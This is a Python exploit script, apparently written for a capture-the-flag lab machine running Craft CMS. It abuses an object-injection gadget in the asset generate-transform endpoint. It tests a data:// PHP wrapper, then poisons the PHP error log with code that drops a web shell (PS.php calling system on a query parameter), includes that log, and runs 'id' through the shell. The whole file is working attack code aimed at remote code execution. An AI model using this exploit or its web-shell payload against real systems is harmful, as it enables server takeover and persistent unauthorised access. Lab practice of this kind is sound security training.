import requests, re, time, sys

HOST = 'http://10.129.54.86'
HEADERS = {'Host': 'orion.htb'}

def send(body):
    time.sleep(0.5)
    s = requests.Session()
    r = s.get(f'{HOST}/index.php?p=admin/login', headers=HEADERS, timeout=30)
    m = re.search(r'csrfTokenValue":"([^"]+)"', r.text)
    if not m:
        raise RuntimeError('No CSRF')
    csrf = m.group(1)
    headers = {**HEADERS, 'Content-Type': 'application/json', 'X-CSRF-Token': csrf}
    r2 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform',
               json=body, headers=headers, timeout=30)
    return r2, csrf, s

def info(tag, r):
    if r:
        print(f'  [{tag}] {r.status_code}, {len(r.text)} bytes')
        for kw in ['<?php', 'file_put_contents', 'system', 'require(', 'Failed', 'PD9waHA', 'data:', 'php://']:
            if kw in r.text:
                i = r.text.index(kw)
                print(f'    [{kw}] at {i}: {r.text[i:i+80]}')
    return r

# Test 1: data:// wrapper with PHP payload
print('[*] Test 1: data:// wrapper', flush=True)
b64payload = 'PD9waHAgZWNobyAiTE9MISI7ID8+'  # <?php echo "LOL!"; ?>
data_path = f'data://text/plain;base64,{b64payload}'
body1 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': data_path
        }
    }
}
r1, _, _ = send(body1)
info('data://', r1)

# Test 2: php://input
print('\n[*] Test 2: php://input (body IS php code)', flush=True)
# This won't work because the body must be JSON. But let's try with PHP code in JSON.
# Actually php://input reads the RAW body, which would be JSON. So the PHP would see JSON, not PHP code.
# This is flawed by design. Skip.

# Test 3: error_log injection with retries
print('\n[*] Test 3: Error log injection (trigger require error)', flush=True)
php_payload = "<?php file_put_contents('/var/www/html/craft/web/PS.php', '<?php system($_GET[cmd]); ?>'); ?>"
inject_path = '/nonexistent/' + php_payload
body3 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': inject_path
        }
    }
}
r3, _, _ = send(body3)
info('trigger', r3)

# Step 4: Include error_log
print('\n[*] Test 4: Include error_log', flush=True)
body4 = {
    'assetId': 11,
    'handle': {
        'width': 1, 'height': 1,
        'as session': {
            'class': 'yii\\rbac\\PhpManager',
            'itemFile': '/var/www/html/craft/storage/logs/phperrors.log'
        }
    }
}
time.sleep(3)
r4, _, _ = send(body4)
info('include', r4)

# Step 5: Check shell
print('\n[*] Test 5: Check PS.php', flush=True)
time.sleep(2)
r5 = requests.get(f'{HOST}/PS.php?cmd=id', headers=HEADERS, timeout=10)
print(f'  [shell] {r5.status_code}')
if r5.status_code == 200:
    print(f'  [+] SHELL: {r5.text[:1000]}')
else:
    print(f'  {r5.text[:100]}')
